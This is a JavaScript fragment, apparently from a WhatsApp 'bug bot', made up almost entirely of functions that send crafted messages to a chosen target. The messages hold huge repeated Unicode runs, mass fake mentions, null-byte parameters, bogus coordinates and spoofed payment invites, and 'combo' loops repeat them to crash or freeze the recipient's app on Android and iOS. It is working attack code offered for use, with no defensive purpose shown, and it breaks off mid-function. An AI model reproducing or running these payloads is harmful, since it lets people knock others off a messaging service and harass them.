let virtex = "🔥⃝⃝𝐂𝐢𝐜𝐢𝐓𝐳𝐲͢𝐗 𝐁𝐥𝐚𝐧𝐤𝐒𝐜𝐫𝐞𝐞𝐧͟͟͞♨️" + "ྫྷ".repeat(77777) + "@0".repeat(50000);
			await cici_syantik.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "Hayolo",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: "https://img1.pixhost.to/images/5120/589174536_yanzhosting.jpg",
									},
									hasMediaAttachment: true,
								},
								body: {
									text: virtex,
								},
								nativeFlowMessage: {
								name: "call_permission_request",
								messageParamsJson: "\u0000".repeat(5000),
								},
								contextInfo: {
								mentionedJid: ["0@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Bokep 18+",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "https://img1.pixhost.to/images/5120/589174536_yanzhosting.jpg",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
            console.log(chalk.red.bold('🔥⃝⃝𝐂𝐢𝐜𝐢𝐓𝐳𝐲͢𝐗 𝐁𝐥𝐚𝐧𝐤𝐒𝐜𝐫𝐞𝐞𝐧͟͟͞♨️'))
   	};

	async function crashui2(target, ptcp = false) {
    await cici_syantik.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "㊙️⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐂𝐢𝐜𝐢𝐓𝐳𝐲 ✰ 𝐂𝐫𝐚𝐬𝐡 𝐔𝐈 𝟐⃠💮⃢📵" + "ꦾ".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " 𝐂𝐢𝐜𝐢𝐓𝐳𝐲 " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function systemUi2(target, Ptcp = false) {
    cici_syantik.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "ꦾ".repeat(250000) + "@0".repeat(100000)
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "㊙️⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐂𝐢𝐜𝐢𝐓𝐳𝐲 𝐔𝐈 𝟒 ✰ 𝐂𝐫𝐚𝐬𝐡 𝐔𝐈 𝟒⃠💮⃢📵",
                        buttons: [
                            {
                                name: "quick_reply",
                                buttonParamsJson: "{\"display_text\":\"㊙️⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐂𝐢𝐜𝐢𝐓𝐳𝐲 𝐔𝐈 𝟒 ✰ 𝐂𝐫𝐚𝐬𝐡 𝐔𝐈 𝟒⃠💮⃢📵\",\"id\":\".groupchat\"}"
                            },
                            {
                                name: "single_select",
                                buttonParamsJson: {
                                    title: "㊙️⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐂𝐢𝐜𝐢𝐓𝐳𝐲 𝐔𝐈 𝟒 ✰ 𝐂𝐫𝐚𝐬𝐡 𝐔𝐈 𝟒⃠💮⃢📵",
                                    sections: [
                                        {
                                            title: "㊙️⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐂𝐢𝐜𝐢𝐓𝐳𝐲 𝐔𝐈 𝟒 ✰ 𝐂𝐫𝐚𝐬𝐡 𝐔𝐈 𝟒⃠💮⃢📵",
                                            rows: []
                                        }
                                    ]
                                }
                            }
                        ]
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "㊙️⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐂𝐢𝐜𝐢𝐓𝐳𝐲 𝐔𝐈 𝟒 ✰ 𝐂𝐫𝐚𝐬𝐡 𝐔𝐈 𝟒⃠💮⃢📵" }]
                    }
                }
            }
        }
    }, { participant: { jid: target }, messageId: null });
}
async function UICRASH(target, ptcp = true) {
  try {
    await cici_syantik.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "㊙️⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐂𝐢𝐜𝐢𝐓𝐳𝐲 𝐔𝐈 𝟒 ✰ 𝐂𝐫𝐚𝐬𝐡 𝐔𝐈 𝟒⃠💮⃢📵⭑̤\n" +
                  "ꦾ".repeat(92000) +
                  "ꦽ".repeat(92000) +
                  `@1`.repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Vamp",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
async function crashUiV5(target, Ptcp = false) {
    cici_syantik.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "㊙️⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐂𝐢𝐜𝐢𝐓𝐳𝐲 𝐔𝐈 𝟒 ✰ 𝐂𝐫𝐚𝐬𝐡 𝐔𝐈 𝟒⃠💮⃢📵" + "@0".repeat(250000) + "ꦾ".repeat(100000)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "call_permission_request",
                                buttonParamsJson: {}
                            }
                        ]
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [
                            {
                                groupJid: "0@s.whatsapp.net",
                                groupSubject: "㊙️⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐂𝐢𝐜𝐢𝐓𝐳𝐲 𝐔𝐈 𝟒 ✰ 𝐂𝐫𝐚𝐬𝐡 𝐔𝐈 𝟒⃠💮⃢📵"
                            }
                        ]
                    }
                }
            }
        }
    }, { participant: { jid: target }, messageId: null });
};
async function systemUi(target, Ptcp = false) {
    cici_syantik.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "ꦾ".repeat(250000) + "@0".repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "㊙️⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐂𝐢𝐜𝐢𝐓𝐳𝐲 𝐔𝐈 𝟒 ✰ 𝐂𝐫𝐚𝐬𝐡 𝐔𝐈 𝟒⃠💮⃢📵" }]
                    }
                }
            }
        }
    }, { participant: { jid: target },  messageId: null });
};
// Command handler
async function NotifKill(target) {
      cici_syantik.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `🔴⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐂𝐢𝐜𝐢𝐓𝐳𝐲 𝐊𝐈𝐋𝐋 𝐍𝐎𝐓𝐈𝐅 ✰ 𝐔𝐈 𝐍𝐎𝐓𝐈𝐅 𝐂𝐑𝐀𝐒𝐇⃠💀⃢🛑` + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "🔴⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐂𝐢𝐜𝐢𝐓𝐳𝐲 𝐊𝐈𝐋𝐋 𝐍𝐎𝐓𝐈𝐅 ✰ 𝐔𝐈 𝐍𝐎𝐓𝐈𝐅 𝐂𝐑𝐀𝐒𝐇⃠💀⃢🛑" + "ꦾ".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }

 // FUNC BUG I-PHONE cici_syantik 🐉
async function aipong(target) {
await cici_syantik.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
async function iponcrash(target) {
await cici_syantik.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
sleep(200)
await cici_syantik.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
sleep(200)
await cici_syantik.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
}
 
 // FUNC BUG IOS cici_syantik 🐉
async function UpiCrash(target) {
      await cici_syantik.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function VenCrash(target) {
      await cici_syantik.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "VENMO",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function AppXCrash(target) {
      await cici_syantik.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "CASHAPP",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function SmCrash(target) {
      await cici_syantik.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SAMSUNGPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function SqCrash(target) {
      await cici_syantik.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SQUARE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function FBiphone(target) {
      await cici_syantik.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "FBPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QXIphone(target) {
      let CrashQAiphone = "𑇂𑆵𑆴𑆿".repeat(60000);
      await cici_syantik.relayMessage(
        target,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: CrashQAiphone,
            url: "https://www.facebook.com/61557890768940/posts/pfbid02qUhvPkN9c6Nuj4tesABBEZFthgtuCjNf7B3kAnYsbmxj6te3rN8uoSSxss5gELXTl/?app=fbl",
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QPayIos(target) {
      await cici_syantik.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "PAYPAL",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QPayStriep(target) {
      await cici_syantik.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "STRIPE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QDIphone(target) {
      cici_syantik.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "ꦾ".repeat(55000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "𐎟🩸⃝⃝𝐂𝐈𝐂𝐈𝐓𝐙𝐘͢𝐕𝐈𝐋𝐄𝐒𝐓𝐀𒁂𝐐𝐃͢𝐈𝐏𝐇𝐎𝐍𝐄͢ 🐉⃝⃝𐎟" + "ꦾ࣯࣯".repeat(50000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }

    //
    async function XiosVirus(target) {
      cici_syantik.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `𐎟🩸⃝⃝𝐂𝐈𝐂𝐈𝐓𝐙𝐘͢𝐕𝐈𝐋𝐄𝐒𝐓𝐀𒁂𝐗𝐈𝐎𝐒͢𝐕𝐈𝐑𝐔𝐒͢ 🐉⃝⃝𐎟` + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "𐎟🩸⃝⃝𝐂𝐈𝐂𝐈𝐓𝐙𝐘͢𝐕𝐈𝐋𝐄𝐒𝐓𝐀𒁂𝐗𝐈𝐎𝐒͢𝐕𝐈𝐑𝐔𝐒͢ 🐉⃝⃝𐎟" + "ꦾ".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }

    //===========================//
       // FUNC BUG cici_syantik
 async function FrezeeMsg1(target) {
            let virtex = "𐎟🔴⃝⃝𝐂𝐈𝐂𝐈𝐓𝐙𝐘͢𝐕𝐈𝐋𝐄𝐒𝐓𝐀𒁂𝐅𝐑𝐄𝐙𝐄𝐄͢𝐅𝐔𝐍𝐂𝟏͢ 🐉⃝⃝𐎟` + ";

            cici_syantik.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "𐎟🔴⃝⃝𝐕𝐈𝐋𝐄𝐒𝐓𝐀͢𝐂𝐗𝐓𒁂𝐅𝐑𝐄𝐙𝐄𝐄͢𝐅𝐔𝐍𝐂𝟏͢ 🐉⃝⃝𐎟" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "RuzxxHere" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
     console.log(chalk.white.bold("𐎟🔴⃝⃝𝐂𝐈𝐂𝐈𝐓𝐙𝐘͢𝐗𝐂𝐓𒁂𝐅𝐑𝐄𝐙𝐄𝐄͢𝐅𝐔𝐍𝐂𝟏͢ 🐉⃝⃝𐎟"));
        }
    
  //===========================\\  
         // FUNC BUG cici_syantik
 async function FrezeeMsg2(target) {
            let virtex = "𐎟💫⃝⃝𝐂𝐈𝐂𝐈𝐓𝐙𝐘͢𝐂𝐒𝐘𝐋𝐘𒁂𝐅𝐑𝐄𝐙𝐄𝐄͢𝐅𝐔𝐍𝐂𝟐͢ 🐉⃝⃝𐎟";
            let memekz = Date.now();

            await cici_syantik.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                locationMessage: {
                                    degreesLatitude: -999.03499999999999,
                                    degreesLongitude: 999.03499999999999
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "💫⃝⃝𝐂𝐈𝐂𝐈𝐓𝐙𝐘͢𝐒𝐘𝐀𝐍𝐓𝐈𝐊𒁂𝐅𝐑𝐄𝐙𝐄𝐄͢𝐅𝐔𝐍𝐂𝟐͢ 🐉⃝⃝𐎟" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "BaraEXECUTE" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
  console.log(chalk.red.bold("𐎟💫⃝⃝𝐂𝐈𝐂𝐈𝐓𝐙𝐘͢𝐒𝐘𝐀𝐍𝐓𝐈𝐊𒁂𝐅𝐑𝐄𝐙𝐄𝐄͢𝐅𝐔𝐍𝐂𝟐͢ 🐉⃝⃝𐎟"));   
        };

  async function f10(target, Ptcp = false) {
    await cici_syantik.relayMessage(target, {
      extendedTextMessage: {
        text: "`© cici_syantik 🔥 Func f10`\n>  ͆ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺\n" + "ી".repeat(55000),
        contextInfo: {
          mentionedJid: ["62895329013688@s.whatsapp.net", ...Array.from({
            length: 15000
          }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")],
          stanzaId: "1234567890ABCDEF",
          participant: "62895329013688@s.whatsapp.net",
          quotedMessage: {
            callLogMesssage: {
              isVideo: false,
              callOutcome: "5",
              durationSecs: "999",
              callType: "REGULAR",
              participants: [{
                jid: "62895329013688@s.whatsapp.net",
                callOutcome: "5"
              }]
            }
          },
          remoteJid: target,
          conversionSource: " X ",
          conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
          conversionDelaySeconds: 10,
          forwardingScore: 10,
          isForwarded: false,
          quotedAd: {
            advertiserName: " X ",
            mediaType: "IMAGE",
            jpegThumbnail: fs.readFileSync("./čicítzyBug.jpg"),
            caption: " X "
          },
          placeholderKey: {
            remoteJid: "0@s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          },
          expiration: 86400,
          ephemeralSettingTimestamp: "1728090592378",
          ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
          externalAdReply: {
            title: "‎᭎ᬼᬼᬼৗীি𑍅𑍑\n⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿\n𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿",
            body: "© cici_syantik 🔥 Func f10",
            mediaType: "VIDEO",
            renderLargerThumbnail: true,
            previewType: "VIDEO",
            thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
            sourceType: " x ",
            sourceId: " x ",
            sourceUrl: "x",
            mediaUrl: "x",
            containsAutoReply: true,
            showAdAttribution: true,
            ctwaClid: "ctwa_clid_example",
            ref: "ref_example"
          },
          entryPointConversionSource: "entry_point_source_example",
          entryPointConversionApp: "entry_point_app_example",
          entryPointConversionDelaySeconds: 5,
          disappearingMode: {},
          actionLink: {
            url: "‎ ‎ "
          },
          groupSubject: " X ",
          parentGroupJid: "6287888888888-1234567890@g.us",
          trustBannerType: " X ",
          trustBannerAction: 1,
          isSampled: false,
          utm: {
            utmSource: " X ",
            utmCampaign: " X "
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: "6287888888888-1234567890@g.us",
            serverMessageId: 1,
            newsletterName: " X ",
            contentType: "UPDATE",
            accessibilityText: " X "
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net"
          },
          smbClientCampaignId: "smb_client_campaign_id_example",
          smbServerCampaignId: "smb_server_campaign_id_example",
          dataSharingContext: {
            showMmDisclosure: true
          }
        }
      }
    }, Ptcp ? {
      participant: {
        jid: target
      }
    } : {});
console.log(chalk.red.bold('© cici_syantik 🔥 Func f10'))
};
 // BATAS CODE FUNC cici_syantik



  // COMBO FUNC V1 cici_syantik 🐉
    async function Comboxx0(target) {
      for (let i = 0; i < 20; i++) {
        await DocFc(target)
        await InvisibleLoadFast(target)
        await InvisiPayload(target)
        await MSGSPAM(target)
        await DocFc(target)
        await NewIos(target, Ptcp = true)
        await invc2(target, ptcp = true)
        await OverloadCursor(target, ptcp = true)
      }
    }

  // COMBO FUNC V1 cici_syantik 🐉
    async function Comboxx1(target) {
      for (let i = 0; i < 20; i++) {
        await NotifKill(target)
        await DocBug(target)
        await LocaBugs(target)
        await BlankScreen(target, Ptcp = true)
        await await NotifKill(target)
        await crashui2(target, ptcp = true)
        await DocFc(target)
        await InvisibleLoadFast(target)
        await InvisiPayload(target)
        await MSGSPAM(target)
        await DocFc(target)
        await NewIos(target, Ptcp = true)
        await invc2(target, ptcp = true)
        await OverloadCursor(target, ptcp = true)
        await DocFc(target)
        await DocBug(target)
        await LocaBugs(target)
        await BlankScreen(target, Ptcp = true)
        await await NotifKill(target)
        await crashui2(target, ptcp = true)
        await OverloadCursor(target, ptcp = true)
      }
    }

   // COMBO FUNC IPONG cici_syantik 🐉
    async function Comboxx2(target) {
      for (let i = 0; i < 20; i++) {
        await InvisiPayload(target)
        await iponcrash(target)
        await aipong(target)
        await await FBiphone(target)
        await QDIphone(target)
        await QXIphone(target)
      }
    }
    
    // COMO FUNC IOS cici_syantik 🐉
    async function Comboxx3(target) {
      for (let i = 0; i < 20; i++) {
        await InvisiPayload(target)
        await UpiCrash(target)
        await VenCrash(target)
        await AppXCrash(target)
        await SmCrash(target)
        await SqCrash(target)
        await FBiphone(target)
        await QXIphone(target)
        await QPayIos(target)
        await QPayStriep(target)
        await QDIphone(target)
        await XiosVirus(target)
      }
    }
    // COMO FUNC FREZE cici_syantik 🐉
    async function Comboxx4(target) {
      for (let i = 0; i < 20; i++) {
        await FrezeeMsg1(target)
        await FrezeeMsg2(target)
        await f10(target, Ptcp = true)
